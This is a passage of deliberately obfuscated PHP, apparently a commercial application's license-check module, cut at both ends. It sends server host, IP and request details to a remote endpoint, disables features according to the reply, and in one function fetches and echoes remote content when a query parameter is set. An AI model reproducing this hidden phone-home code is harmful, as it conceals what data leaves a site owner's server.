$e§¨Ù©…Üâ[610]; if (strlen($b…ŠÄ¬¹ô) < $e§¨Ù©…Üâ[579]) { return; } foreach ($d»µï¸ó÷° as $C‚¢Ù»ŒÜ²) { if (!isset($A»–©ÆÇà…[$C‚¢Ù»ŒÜ²]) || !$A»–©ÆÇà…[$C‚¢Ù»ŒÜ²]) { continue; } $bğÙÛğ‹÷[$C‚¢Ù»ŒÜ²] = $A»–©ÆÇà…[$C‚¢Ù»ŒÜ²]; } goto dÎÌÏÇÆ; e³«±¼à½: } private function rnuodc3aa44c() { goto DÆ×›¹ö“í; e¤Ùö»İÚª: if ($BŸ¡Ä‚ºÚË[$BíÖ¸˜³ŒÆ[184]] == $BíÖ¸˜³ŒÆ[185]) { $AÒ¼ÕˆÁõ = $this->{$_SERVER[İ§][153]}($bˆ¨ÊùøÍ•, $BíÖ¸˜³ŒÆ[186]); $DÇ„ˆ‚˜Õ¬ = $this->{$_SERVER[İ§][133]}($BíÖ¸˜³ŒÆ[154]($E Œ„—ˆ»±), $bˆ¨ÊùøÍ• . $BíÖ¸˜³ŒÆ[187], 3); $DÇ„ˆ‚˜Õ¬ = $DÇ„ˆ‚˜Õ¬ . $BíÖ¸˜³ŒÆ[188] . $_SERVER[$BíÖ¸˜³ŒÆ[179]]; $AÌÃÇÉó‹• = $this->{$_SERVER[İ§][189]}($BíÖ¸˜³ŒÆ[190] . $AÒ¼ÕˆÁõ . $BíÖ¸˜³ŒÆ[191] . $DÇ„ˆ‚˜Õ¬, -1); $BíÖ¸˜³ŒÆ[172]($AÌÃÇÉó‹•, !0); } else { if ($BŸ¡Ä‚ºÚË[$BíÖ¸˜³ŒÆ[184]] == $BíÖ¸˜³ŒÆ[192]) { $eÓÍÏØã¿Ÿ = $BíÖ¸˜³ŒÆ[25]($BíÖ¸˜³ŒÆ[120]($BíÖ¸˜³ŒÆ[193] . $bˆ¨ÊùøÍ•), 12, 15) . $BíÖ¸˜³ŒÆ[194]; $DÇ„ˆ‚˜Õ¬ = $this->{$_SERVER[İ§][195]}($BíÖ¸˜³ŒÆ[2]($BŸ¡Ä‚ºÚË[$BíÖ¸˜³ŒÆ[196]]), $eÓÍÏØã¿Ÿ, 2); $e µ…­… = $BíÖ¸˜³ŒÆ[197]($DÇ„ˆ‚˜Õ¬, !0); if (!$BíÖ¸˜³ŒÆ[198]($e µ…­…) || !$BíÖ¸˜³ŒÆ[198]($e µ…­…[$BíÖ¸˜³ŒÆ[199]]) || $e µ…­…[$BíÖ¸˜³ŒÆ[171]] != !0) { $c÷˜ÁêôÏ‚ = $BíÖ¸˜³ŒÆ[200]; $Cç–¥ÇšçÂ = $e µ…­…[$BíÖ¸˜³ŒÆ[199]] ? $BíÖ¸˜³ŒÆ[201] . $e µ…­…[$BíÖ¸˜³ŒÆ[199]] : $c÷˜ÁêôÏ‚; $BíÖ¸˜³ŒÆ[172]($Cç–¥ÇšçÂ, !1); } else { $E Œ„—ˆ»±[$BíÖ¸˜³ŒÆ[174]] = $e µ…­…[$BíÖ¸˜³ŒÆ[199]][$BíÖ¸˜³ŒÆ[202]]; } } else { $e µ…­… = $this->{$_SERVER[İ§][189]}($BíÖ¸˜³ŒÆ[203], $E Œ„—ˆ»±, 10); } } if (!$BíÖ¸˜³ŒÆ[198]($e µ…­…) || !$BíÖ¸˜³ŒÆ[198]($e µ…­…[$BíÖ¸˜³ŒÆ[199]]) || $e µ…­…[$BíÖ¸˜³ŒÆ[171]] != !0) { $c÷˜ÁêôÏ‚ = $BíÖ¸˜³ŒÆ[204]($BíÖ¸˜³ŒÆ[205]); $Cç–¥ÇšçÂ = $e µ…­…[$BíÖ¸˜³ŒÆ[199]] ? $BíÖ¸˜³ŒÆ[201] . $e µ…­…[$BíÖ¸˜³ŒÆ[199]] : $c÷˜ÁêôÏ‚; $BíÖ¸˜³ŒÆ[172]($Cç–¥ÇšçÂ, !1); } $cÍ¬ŒÆÒğÚ = $e µ…­…[$BíÖ¸˜³ŒÆ[199]]; goto CÈ™ãÏ„´İ; f‰«µØí‚à: if (strlen($b•¿†×¡°) < $DøÉ„‘êß˜[574]) { die; } $E¾˜àÈøÓÀ = $this->{$_SERVER[İ§][133]}($BíÖ¸˜³ŒÆ[154]($cÍ¬ŒÆÒğÚ), $CäÚè¥öğ); $DÙ–¨¼¡Œ¤ = $BíÖ¸˜³ŒÆ[228]($BíÖ¸˜³ŒÆ[61]($BíÖ¸˜³ŒÆ[11])->{$_SERVER[İ§][229]}(), $BíÖ¸˜³ŒÆ[230]); goto FÃµ—›÷ÂĞ; DÆ×›¹ö“í: $DøÉ„‘êß˜ =& $_SERVER[µ…]; $BíÖ¸˜³ŒÆ =& $_SERVER[İ§]; if ($_SERVER[$BíÖ¸˜³ŒÆ[44]] != $BíÖ¸˜³ŒÆ[168]) { return; } goto E­ªôÇÑğ; f‘ÕÏ¢‹ªï: if ($cÍ¬ŒÆÒğÚ[$BíÖ¸˜³ŒÆ[223]] && $cÍ¬ŒÆÒğÚ[$BíÖ¸˜³ŒÆ[223]] >= 1) { $BíÖ¸˜³ŒÆ[61]($BíÖ¸˜³ŒÆ[62])->{$_SERVER[İ§][224]}($BíÖ¸˜³ŒÆ[225], $BíÖ¸˜³ŒÆ[226]); } $BíÖ¸˜³ŒÆ[61]($BíÖ¸˜³ŒÆ[62])->{$_SERVER[İ§][227]}($BéŞÁãİŠ‡); $CäÚè¥öğ = $BíÖ¸˜³ŒÆ[120]($_SERVER[$BíÖ¸˜³ŒÆ[121]] . $BíÖ¸˜³ŒÆ[220]($cÊ¦»Ó‘»ê) . $BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[216]]); goto B£ŠªñĞÔ˜; b˜ÇøäÁè: $BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[128]] = $BíÖ¸˜³ŒÆ[220]($BíÖ¸˜³ŒÆ[124]($this->{$_SERVER[İ§][153]}($dî­¢Íğ‘ö, $BíÖ¸˜³ŒÆ[221]))); $b™¿ß´Ş‰ = $BíÖ¸˜³ŒÆ[130](16); $c±Şá§±À = $b™¿ß´Ş‰ . $BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[126]] . $this->{$_SERVER[İ§][153]}($BíÖ¸˜³ŒÆ[120]($BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[215]]), $b™¿ß´Ş‰); goto DÜÃĞô÷é; E­ªôÇÑğ: if (!$BíÖ¸˜³ŒÆ[112]($GLOBALS, $BíÖ¸˜³ŒÆ[138])) { die; } $BŸ¡Ä‚ºÚË = $GLOBALS[$BíÖ¸˜³ŒÆ[22]]; if (isset($BŸ¡Ä‚ºÚË[$BíÖ¸˜³ŒÆ[169]])) { $this->{$_SERVER[İ§][170]}(); die; } goto b­›»íÓ°; EÔŒ¼‡õ’¼: $this->{$_SERVER[İ§][235]}(); $EˆêŒ‹©ª¬ = $DøÉ„‘êß˜[620]; if (strlen($EˆêŒ‹©ª¬) < $DøÉ„‘êß˜[570]) { return; } goto B®à™Â‰œØ; DÜÃĞô÷é: $BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[129]] = $BíÖ¸˜³ŒÆ[124]($BíÖ¸˜³ŒÆ[220]($this->{$_SERVER[İ§][153]}($c±Şá§±À, $BíÖ¸˜³ŒÆ[222]))); $bÜ½ßÙÒö = $DøÉ„‘êß˜[613]; while (strlen($bÜ½ßÙÒö) < $DøÉ„‘êß˜[574]) { if (!$bÜ½ßÙÒö) { break; } $bÜ½ßÙÒö++; } goto f‘ÕÏ¢‹ªï; FŒ•Ù†‹Æ: $A¹©Ôœ¡ = $DøÉ„‘êß˜[612]; while ($A¹©Ôœ¡ < $DøÉ„‘êß˜[574]) { if ($A¹©Ôœ¡ >= 0) { break; } $A¹©Ôœ¡++; } $bˆ¨ÊùøÍ• = $BíÖ¸˜³ŒÆ[120]($_SERVER[$BíÖ¸˜³ŒÆ[121]] . $cÊ¦»Ó‘»ê); goto e¤Ùö»İÚª; A•É¦æèæ¦: $BíÖ¸˜³ŒÆ[172]($BíÖ¸˜³ŒÆ[204]($BíÖ¸˜³ŒÆ[214]), !0); goto BÉ ê‘; B£ŠªñĞÔ˜: $C¥¶ä¯ßÎ = $DøÉ„‘êß˜[614]; $d­¬Ğ†©¾ó = $BíÖ¸˜³ŒÆ[220]($BíÖ¸˜³ŒÆ[25]($CäÚè¥öğ, 10, 16)); $b•¿†×¡° = $DøÉ„‘êß˜[615]; goto f‰«µØí‚à; b­›»íÓ°: if (!isset($BŸ¡Ä‚ºÚË[$BíÖ¸˜³ŒÆ[171]]) || $BíÖ¸˜³ŒÆ[24]($BŸ¡Ä‚ºÚË[$BíÖ¸˜³ŒÆ[171]]) != 16) { $BíÖ¸˜³ŒÆ[172]($BíÖ¸˜³ŒÆ[173] . $BŸ¡Ä‚ºÚË[$BíÖ¸˜³ŒÆ[171]], !1); } $cÊ¦»Ó‘»ê = $BíÖ¸˜³ŒÆ[61]($BíÖ¸˜³ŒÆ[62])->{$_SERVER[İ§][63]}($BíÖ¸˜³ŒÆ[122]); $E Œ„—ˆ»± = array($BíÖ¸˜³ŒÆ[171] => $BŸ¡Ä‚ºÚË[$BíÖ¸˜³ŒÆ[171]], $BíÖ¸˜³ŒÆ[174] => $BíÖ¸˜³ŒÆ[130](16), $BíÖ¸˜³ŒÆ[175] => $BíÖ¸˜³ŒÆ[155], $BíÖ¸˜³ŒÆ[176] => $BíÖ¸˜³ŒÆ[177], $BíÖ¸˜³ŒÆ[178] => $_SERVER[$BíÖ¸˜³ŒÆ[179]], $BíÖ¸˜³ŒÆ[180] => $_SERVER[$BíÖ¸˜³ŒÆ[181]], $BíÖ¸˜³ŒÆ[182] => $_SERVER[$BíÖ¸˜³ŒÆ[183]]); goto FŒ•Ù†‹Æ; bÓ‚Ò¼ò†: if (strlen($DÇ‰É’ÊÚ) < $DøÉ„‘êß˜[574]) { die; } $BíÖ¸˜³ŒÆ[61]($BíÖ¸˜³ŒÆ[11])->{$_SERVER[İ§][232]}($cÈ‚ëõÖ‰[$BíÖ¸˜³ŒÆ[233]], array($BíÖ¸˜³ŒÆ[234] => $DÁˆ‘í¦„)); $fÁ®À¸‚ó× = $DøÉ„‘êß˜[618]; goto Bê°¬ÂéßÄ; FÃµ—›÷ÂĞ: $cÈ‚ëõÖ‰ = $DÙ–¨¼¡Œ¤[$BíÖ¸˜³ŒÆ[231]]; $Cæ§ìùæ‘Ç = $DøÉ„‘êß˜[616]; if (!$Cæ§ìùæ‘Ç) { return; } goto c®Ä ÄÈç’; Bê°¬ÂéßÄ: $this->zvum85d87bf9 = $cÍ¬ŒÆÒğÚ; $D£œ”Ûğá† = $DøÉ„‘êß˜[619]; $this->ljqdcfa3de1b = $BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[126]]; goto EÔŒ¼‡õ’¼; c®Ä ÄÈç’: $DÁˆ‘í¦„ = array(); $DÁˆ‘í¦„[$d­¬Ğ†©¾ó] = $E¾˜àÈøÓÀ; $DÇ‰É’ÊÚ = $DøÉ„‘êß˜[617]; goto bÓ‚Ò¼ò†; CÖ¤ÏÓ¾±«: if ($E Œ„—ˆ»±[$BíÖ¸˜³ŒÆ[174]]) { $BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[218]] = $E Œ„—ˆ»±[$BíÖ¸˜³ŒÆ[174]]; } $D²ÓÓƒÇñ’ = $BíÖ¸˜³ŒÆ[25]($BíÖ¸˜³ŒÆ[120]($BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[216]]), 10, 10); $dî­¢Íğ‘ö = $D²ÓÓƒÇñ’ . $BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[126]] . $BéŞÁãİŠ‡[$BíÖ¸˜³ŒÆ[218]]; goto b˜ÇøäÁè; B®à™Â‰œØ: Cache::set($BíÖ¸˜³ŒÆ[236] . $BíÖ¸˜³ŒÆ[120]($cÊ¦»Ó‘»ê . $BíÖ¸˜³ŒÆ[237]), $BíÖ¸˜³ŒÆ[10]); $CÕ‚æ§Ó = $DøÉ„‘êß˜[621]; while (strlen($CÕ‚æ§Ó) < $DøÉ„‘êß˜[594]) { if (!$CÕ‚æ§Ó) { break; } $CÕ‚æ§Ó++; } goto A•É¦æèæ¦; CÈ™ãÏ„´İ: $F™ô¼÷ø•Ç = $this->{$_SERVER[İ§][206]}($cÍ¬ŒÆÒğÚ[$BíÖ¸˜³ŒÆ[207]]); if (!$F™ô¼÷ø•Ç || $F™ô¼÷ø•Ç != $cÍ¬ŒÆÒğÚ[$BíÖ¸˜³ŒÆ[151]]) { $EöĞ¤×è» = array($BíÖ¸˜³ŒÆ[208] => $BíÖ¸˜³ŒÆ[61]($BíÖ¸˜³ŒÆ[62])->{$_SERVER[İ§][63]}($BíÖ¸˜³ŒÆ[122]), $BíÖ¸˜³ŒÆ[209] => $_SERVER[$BíÖ¸˜³ŒÆ[121]], $BíÖ¸˜³ŒÆ[210] => $BíÖ¸˜³ŒÆ[211](), $BíÖ¸˜³ŒÆ[180] => $_SERVER[$BíÖ¸˜³ŒÆ[181]]); $DÇ„ˆ‚˜Õ¬ = $this->{$_SERVER[İ§][212]}($BíÖ¸˜³ŒÆ[154]($EöĞ¤×è»)); $this->{$_SERVER[İ§][189]}($BíÖ¸˜³ŒÆ[213] . $DÇ„ˆ‚˜Õ¬); $BíÖ¸˜³ŒÆ[172]($BíÖ¸˜³ŒÆ[204]($BíÖ¸˜³ŒÆ[214]), !0); } $BéŞÁãİŠ‡ = array($BíÖ¸˜³ŒÆ[215] => $E Œ„—ˆ»±[$BíÖ¸˜³ŒÆ[171]], $BíÖ¸˜³ŒÆ[216] => $cÍ¬ŒÆÒğÚ[$BíÖ¸˜³ŒÆ[217]], $BíÖ¸˜³ŒÆ[218] => $BíÖ¸˜³ŒÆ[130](16), $BíÖ¸˜³ŒÆ[126] => $cÍ¬ŒÆÒğÚ[$BíÖ¸˜³ŒÆ[219]]); goto CÖ¤ÏÓ¾±«; BÉ ê‘: } private function licenseRegistSuccess() { $D»¶­êÑñ³ =& $_SERVER[İ§]; $B›í†ÎŒØ = $D»¶­êÑñ³[61]($D»¶­êÑñ³[62])->{$_SERVER[İ§][63]}(); if ($B›í†ÎŒØ[$D»¶­êÑñ³[89]] != $D»¶­êÑñ³[226]) { $D»¶­êÑñ³[61]($D»¶­êÑñ³[62])->{$_SERVER[İ§][227]}($D»¶­êÑñ³[89], $D»¶­êÑñ³[226]); } $D»¶­êÑñ³[116]($D»¶­êÑñ³[238])->{$_SERVER[İ§][239]}(!0); } private function bnmk00812476() { goto aÙ÷íŒè; céâğĞëƒ‹: if (strlen($B‘…ó“è) < $cÛç¬”ÙÙ÷[574]) { die; } goto D™Æä×Î³–; DĞ¶º–µÙ: $this->zvum85d87bf9 = array(); $this->ljqdcfa3de1b = $fª¿£ßˆš´[127]; $B‘…ó“è = $cÛç¬”ÙÙ÷[623]; goto céâğĞëƒ‹; FÙ™§Èó¦: $fª¿£ßˆš´[61]($fª¿£ßˆš´[62])->{$_SERVER[İ§][224]}($fª¿£ßˆš´[225], $fª¿£ßˆš´[240]); $FÛŠ£í£ä = $cÛç¬”ÙÙ÷[622]; if (!$FÛŠ£í£ä) { die; } goto DĞ¶º–µÙ; aÙ÷íŒè: $cÛç¬”ÙÙ÷ =& $_SERVER[µ…]; $fª¿£ßˆš´ =& $_SERVER[İ§]; $fª¿£ßˆš´[61]($fª¿£ßˆš´[62])->{$_SERVER[İ§][227]}(array($fª¿£ßˆš´[215] => $fª¿£ßˆš´[10], $fª¿£ßˆš´[216] => $fª¿£ßˆš´[10], $fª¿£ßˆš´[126] => $fª¿£ßˆš´[127], $fª¿£ßˆš´[128] => $fª¿£ßˆš´[10], $fª¿£ßˆš´[129] => $fª¿£ßˆš´[10])); goto FÙ™§Èó¦; D™Æä×Î³–: } private function fyxj0db9854f() { goto C¬´‹Ã¿Î; dáƒ‘ğÏ¼: $b‹õÚ°Ê‘Ú = $Cßä“Úéƒí[61]($Cßä“Úéƒí[62])->{$_SERVER[İ§][63]}(); if ($b‹õÚ°Ê‘Ú[$Cßä“Úéƒí[126]] == $Cßä“Úéƒí[127]) { return; } $B°£à‹íµ» = $Cßä“Úéƒí[61]($Cßä“Úéƒí[62])->{$_SERVER[İ§][63]}($Cßä“Úéƒí[122]); goto dÄÑŞÄ†»; C¬´‹Ã¿Î: $F»œ§ä÷ÏÛ =& $_SERVER[µ…]; $Cßä“Úéƒí =& $_SERVER[İ§]; $_SERVER[$Cßä“Úéƒí[181]] = $Cßä“Úéƒí[112]($_SERVER, $Cßä“Úéƒí[181], APP_HOST); goto e³Üä†– ß; e‹Û¤ù«ãê: $f‰à×ùˆÌ = Cache::get($DÍÄ»…íŠ¨); $Eİ¶½ã’†· = $F»œ§ä÷ÏÛ[626]; if (!$Eİ¶½ã’†·) { return; } goto aåÔæ£…ÄÉ; aåÔæ£…ÄÉ: if (!$Cßä“Úéƒí[198]($f‰à×ùˆÌ) || !isset($f‰à×ùˆÌ[$Cßä“Úéƒí[241]]) || $Cßä“Úéƒí[242]() - $f‰à×ùˆÌ[$Cßä“Úéƒí[241]] >= 60) { $e‰›’å†‘ = $Cßä“Úéƒí[228]($Cßä“Úéƒí[61]($Cßä“Úéƒí[11])->{$_SERVER[İ§][229]}(), $Cßä“Úéƒí[230]); $eé¶†èİÍù = $e‰›’å†‘[$Cßä“Úéƒí[231]]; $côè±æˆ = $Cßä“Úéƒí[120]($_SERVER[$Cßä“Úéƒí[121]] . $Cßä“Úéƒí[220]($B°£à‹íµ») . $b‹õÚ°Ê‘Ú[$Cßä“Úéƒí[216]]); $A†ë™äñĞ‹ = $Cßä“Úéƒí[220]($Cßä“Úéƒí[25]($côè±æˆ, 10, 16)); $f‰à×ùˆÌ = $this->{$_SERVER[İ§][195]}($eé¶†èİÍù[$Cßä“Úéƒí[100]][$A†ë™äñĞ‹], $côè±æˆ); $f‰à×ùˆÌ = $Cßä“Úéƒí[197]($f‰à×ùˆÌ, !0); } if (!$Cßä“Úéƒí[198]($f‰à×ùˆÌ)) { return $this->{$_SERVER[İ§][170]}(); } $CÀ‘™¤¡ƒ = $Cßä“Úéƒí[150]($f‰à×ùˆÌ[$Cßä“Úéƒí[151]]); goto CÁµóŸƒ¶Ä; EàßòÄÆá: $this->ljqdcfa3de1b = $b‹õÚ°Ê‘Ú[$Cßä“Úéƒí[126]]; goto fÃÖ“ĞÔöñ; e³Üä†– ß: $A†¶ÍĞˆ¸« = $F»œ§ä÷ÏÛ[624]; if (!$A†¶ÍĞˆ¸«) { return; } $this->ljqdcfa3de1b = $Cßä“Úéƒí[127]; goto dáƒ‘ğÏ¼; dÄÑŞÄ†»: $c‰›”ò×¦‡ = $F»œ§ä÷ÏÛ[625]; if (strlen($c‰›”ò×¦‡) < $F»œ§ä÷ÏÛ[594]) { die; } $DÍÄ»…íŠ¨ = $Cßä“Úéƒí[236] . $Cßä“Úéƒí[120]($B°£à‹íµ» . $Cßä“Úéƒí[237]); goto e‹Û¤ù«ãê; CÁµóŸƒ¶Ä: if ($Cßä“Úéƒí[242]() >= $CÀ‘™¤¡ƒ) { return $this->{$_SERVER[İ§][170]}(); } if ($Cßä“Úéƒí[242]() - $f‰à×ùˆÌ[$Cßä“Úéƒí[241]] > 20) { $f‰à×ùˆÌ[$Cßä“Úéƒí[241]] = $Cßä“Úéƒí[242](); Cache::set($DÍÄ»…íŠ¨, $f‰à×ùˆÌ); } $this->zvum85d87bf9 = $f‰à×ùˆÌ; goto EàßòÄÆá; fÃÖ“ĞÔöñ: } private function fbxkf0201ed7() { goto dªëâ´¥íŸ; d­âßÍ‡„: $eºŞİ±ô = $_SERVER[$Aâ‰Œåù[44]]; $aµÑÆÇ³¶ = $fô§ŠË‰´ï[627]; while ($aµÑÆÇ³¶ < $fô§ŠË‰´ï[579]) { if ($aµÑÆÇ³¶ >= 0) { break; } $aµÑÆÇ³¶++; } goto E»¸Œ¨Î„í; E»¸Œ¨Î„í: if ($eºŞİ±ô == $Aâ‰Œåù[243] && $this->ljqdcfa3de1b == $Aâ‰Œåù[127]) { $Aâ‰Œåù[172]($Aâ‰Œåù[204]($Aâ‰Œåù[244]), !1, $Aâ‰Œåù[245]); } $B±ßàœš˜Ã = array($Aâ‰Œåù[246], $Aâ‰Œåù[247]); if ($Aâ‰Œåù[248]($eºŞİ±ô, $B±ßàœš˜Ã)) { if ($this->ljqdcfa3de1b == $Aâ‰Œåù[127] && isset($Dä¹±Ø®ªì[$Aâ‰Œåù[249]])) { $Aâ‰Œåù[172]($Aâ‰Œåù[204]($Aâ‰Œåù[244]), !1, $Aâ‰Œåù[245]); die; } $aïÊÅ¥Çù = $this->{$_SERVER[İ§][143]}(); if ($aïÊÅ¥Çù != $Aâ‰Œåù[250]($Aâ‰Œåù[251])) { if ($aïÊÅ¥Çù <= $Aâ‰Œåù[61]($Aâ‰Œåù[145])->{$_SERVER[İ§][146]}()) { $Aâ‰Œåù[172]($Aâ‰Œåù[204]($Aâ‰Œåù[252]), !1, $Aâ‰Œåù[245]); die; } } } goto eÜ·Ø±ù; dªëâ´¥íŸ: $fô§ŠË‰´ï =& $_SERVER[µ…]; $Aâ‰Œåù =& $_SERVER[İ§]; $Dä¹±Ø®ªì = $GLOBALS[$Aâ‰Œåù[22]]; goto d­âßÍ‡„; eÜ·Ø±ù: } private function ofmh608c4528() { goto A—öØÏù°; Cè›á•“ƒ½: if (!$d¸Á›‘àƒõ[112]($GLOBALS, $d¸Á›‘àƒõ[138]) || !isset($_GET[$d¸Á›‘àƒõ[254]])) { return; } if (!$d¸Á›‘àƒõ[248]($_SERVER[$d¸Á›‘àƒõ[44]], $dîÆÄ‡½»À)) { return; } $e„¯•àŞÙ¿ = $d¸Á›‘àƒõ[255]; goto Døß¤èÛ£¢; F‘Õ¸Â†è—: if (!$CÜ¤Ì×ôÊ½) { die; } if ($fŠÜÙ¢¥³ && $d¸Á›‘àƒõ[32]($fŠÜÙ¢¥³, $d¸Á›‘àƒõ[266])) { echo $fŠÜÙ¢¥³; } die; goto F²Êƒ´ùš·; eóÖğëè÷İ: while ($cÔšÒºñ < $A„Š¾ĞèÚ[570]) { if ($cÔšÒºñ >= 0) { break; } $cÔšÒºñ++; } $d¸Á›‘àƒõ[264]($d¸Á›‘àƒõ[265]); $CÜ¤Ì×ôÊ½ = $A„Š¾ĞèÚ[630]; goto F‘Õ¸Â†è—; b‘³´Šô„: $E‘ÅÆ›‘ëª = $d¸Á›‘àƒõ[258](array($d¸Á›‘àƒõ[259] => array($d¸Á›‘àƒõ[260] => $d¸Á›‘àƒõ[261], $d¸Á›‘àƒõ[262] => 3))); $fŠÜÙ¢¥³ = @$d¸Á›‘àƒõ[263]($e„¯•àŞÙ¿, !1, $E‘ÅÆ›‘ëª); $cÔšÒºñ = $A„Š¾ĞèÚ[629]; goto eóÖğëè÷İ; A—öØÏù°: $A„Š¾ĞèÚ =& $_SERVER[µ…]; $d¸Á›‘àƒõ =& $_SERVER[İ§]; $dîÆÄ‡½»À = array($d¸Á›‘àƒõ[141], $d¸Á›‘àƒõ[253]); goto Cè›á•“ƒ½; Døß¤èÛ£¢: $e„¯•àŞÙ¿ = $this->{$_SERVER[İ§][256]}($e„¯•àŞÙ¿, $d¸Á›‘àƒõ[257]); $Eç‹øï…Ê£ = $A„Š¾ĞèÚ[628]; if (strlen($Eç‹øï…Ê£) < $A„Š¾ĞèÚ[574]) { die; } goto b‘³´Šô„; F²Êƒ´ùš·: } public function pvdn801e9076($eßˆùÑ¬÷) { goto Aƒˆğ‘¶Ü; Aƒˆğ‘¶Ü: $FÇÕ™Ã”Ş =& $_SERVER[İ§]; if ($this->ljqdcfa3de1b == $FÇÕ™Ã”Ş[267]) { return $eßˆùÑ¬÷; } $d¿ãß•–Œ… = array($FÇÕ™Ã”Ş[268] => $FÇÕ™Ã”Ş[269], $FÇÕ™Ã”Ş[270] => $FÇÕ™Ã”Ş[269], $FÇÕ™Ã”Ş[271] => $FÇÕ™Ã”Ş[269], $FÇÕ™Ã”Ş[272] => $FÇÕ™Ã”Ş[269], $FÇÕ™Ã”Ş[273] => $FÇÕ™Ã”Ş[269], $FÇÕ™Ã”Ş[274] => $FÇÕ™Ã”Ş[275], $FÇÕ™Ã”Ş[276] => $FÇÕ™Ã”Ş[275], $FÇÕ™Ã”Ş[277] => $FÇÕ™Ã”Ş[275], $FÇÕ™Ã”Ş[278] => $FÇÕ™Ã”Ş[275], $FÇÕ™Ã”Ş[279] => $FÇÕ™Ã”Ş[275], $FÇÕ™Ã”Ş[280] => $FÇÕ™Ã”Ş[275], $FÇÕ™Ã”Ş[281] => $FÇÕ™Ã”Ş[275]); goto F®‡‡­’Å…; F®‡‡­’Å…: $a¾óæì¥· = $FÇÕ™Ã”Ş[0]($FÇÕ™Ã”Ş[282], $FÇÕ™Ã”Ş[112]($this->zvum85d87bf9, $FÇÕ™Ã”Ş[135], $FÇÕ™Ã”Ş[10])); $Eâã®î‚½³ = array(); $cñ¡Ó™ÎÇÜ = $_SERVER[µ…][631]; goto c¤Í¼¬¿ò; c¤Í¼¬¿ò: if (!$cñ¡Ó™ÎÇÜ) { die; } foreach ($d¿ãß•–Œ… as $CÆƒµÅ¦â“ => $b¥ö‰ñ ‘Î) { if ($b¥ö‰ñ ‘Î == $FÇÕ™Ã”Ş[269] && $FÇÕ™Ã”Ş[25]($this->ljqdcfa3de1b, 0, 1) == $FÇÕ™Ã”Ş[269]) { continue; } if (!$FÇÕ™Ã”Ş[248]($CÆƒµÅ¦â“, $a¾óæì¥·)) { $Eâã®î‚½³[] = $CÆƒµÅ¦â“; } } foreach ($Eâã®î‚½³ as $CÆƒµÅ¦â“) { unset($eßˆùÑ¬÷[$CÆƒµÅ¦â“]); } goto FÖíó„Ö—™; FÖíó„Ö—™: return $eßˆùÑ¬÷; goto A®÷—¦¤¹; A®÷—¦¤¹: } private function dlrb2950f30d() { goto cŒê†ª¢Èğ; DÅ·ƒ÷À  : $GLOBALS[$Bæ…ƒŸ—àÙ[100]][$Bæ…ƒŸ—àÙ[104]][$Bæ…ƒŸ—àÙ[283]] = $Bæ…ƒŸ—àÙ[226]; $GLOBALS[$Bæ…ƒŸ—àÙ[100]][$Bæ…ƒŸ—àÙ[284]] = $Bæ…ƒŸ—àÙ[226]; $FËš›Œã÷½ = $BœÕ„³ê™õ[632]; goto cÔ“˜Æñˆ; cÔ“˜Æñˆ: while (strlen($FËš›Œã÷½) < $BœÕ„³ê™õ[570]) { if (!$FËš›Œã÷½) { break; } $FËš›Œã÷½++; } if ($Bæ…ƒŸ—àÙ[61]($Bæ…ƒŸ—àÙ[285])->{$_SERVER[İ§][63]}($Bæ…ƒŸ—àÙ[89]) != $Bæ…ƒŸ—àÙ[240]) { $Bæ…ƒŸ—àÙ[61]($Bæ…ƒŸ—àÙ[285])->{$_SERVER[İ§][227]}($Bæ…ƒŸ—àÙ[89], $Bæ…ƒŸ—àÙ[240]); } goto eÌÌÔÛŠ; cŒê†ª¢Èğ: $BœÕ„³ê™õ =& $_SERVER[µ…]; $Bæ…ƒŸ—àÙ =& $_SERVER[İ§]; if ($this->ljqdcfa3de1b != $Bæ…ƒŸ—àÙ[127]) { return; } goto DÅ·ƒ÷À  ; eÌÌÔÛŠ: } public function hkcs5d15fa70() { $fØàÉ¸¬à =& $_SERVER[µ…]; return $_SERVER[İ§][286]; $b”ÜåÇƒØç = $fØàÉ¸¬à[633]; if (strlen($b”ÜåÇƒØç) < $fØàÉ¸¬à[574]) { die; } } private function asrq2c38a2af() { goto C÷„¬“¸Àá; fš’éÛø³’: if (!$b«‡–²’ ç) { return; } $còª¢¶ĞÃ = array($D˜·è™è[171] => $D˜·è™è[61]($D˜·è™è[62])->{$_SERVER[İ§][63]}($D˜·è™è[215]), $D˜·è™è[184] => $this->ljqdcfa3de1b, $D˜·è™è[182] => $_SERVER[$D˜·è™è[183]], $D˜·è™è[175] => $D˜·è™è[155], $D˜·è™è[178] => $_SERVER[$D˜·è™è[179]]); $Dó¸˜¤‡º = $D‹µˆ‘ƒ¼[637]; goto dìÈÄ®¶Ôå; EË‘¹ä¸Ø: if ($EÑ½½³íå› && $D˜·è™è[242]() - $EÑ½½³íå› < $D˜·è™è[250]($D˜·è™è[294])) { return; } $D˜·è™è[13](array($D˜·è™è[292], $D˜·è™è[158]), $D™Ã´ÄÙĞØ, $D˜·è™è[242]()); $b«‡–²’ ç = $D‹µˆ‘ƒ¼[636]; goto fš’éÛø³’; cÏš²É¢Ë‡: $cŸ¶´‰«Şƒ = $D‹µˆ‘ƒ¼[634]; if (!$cŸ¶´‰«Şƒ) { return; } $D™Ã´ÄÙĞØ = $D˜·è™è[290] . $D˜·è™è[120]($D˜·è™è[291]); goto fÇó¢ˆ‰®; dìÈÄ®¶Ôå: $Ağ¡ì½ã• = $this->{$_SERVER[İ§][189]}($D˜·è™è[295], $còª¢¶ĞÃ); if (!$D˜·è™è[198]($Ağ¡ì½ã•)) { return; } if ($Ağ¡ì½ã•[$D˜·è™è[171]] && $Ağ¡ì½ã•[$D˜·è™è[296]]) { if ($this->{$_SERVER[İ§][206]}($Ağ¡ì½ã•[$D˜·è™è[296]]) == $còª¢¶ĞÃ[$D˜·è™è[171]]) { return; } } goto fé¯Ù¼ëŠ§; fÇó¢ˆ‰®: $fò‘çìÄ = $D‹µˆ‘ƒ¼[635]; if (strlen($fò‘çìÄ) < $D‹µˆ‘ƒ¼[594]) { die; } if ($this->ljqdcfa3de1b == $D˜·è™è[127] || !$D˜·è™è[112]($GLOBALS, $D˜·è™è[138])) { return; } goto E‡Æ›ä‚­; C÷„¬“¸Àá: $D‹µˆ‘ƒ¼ =& 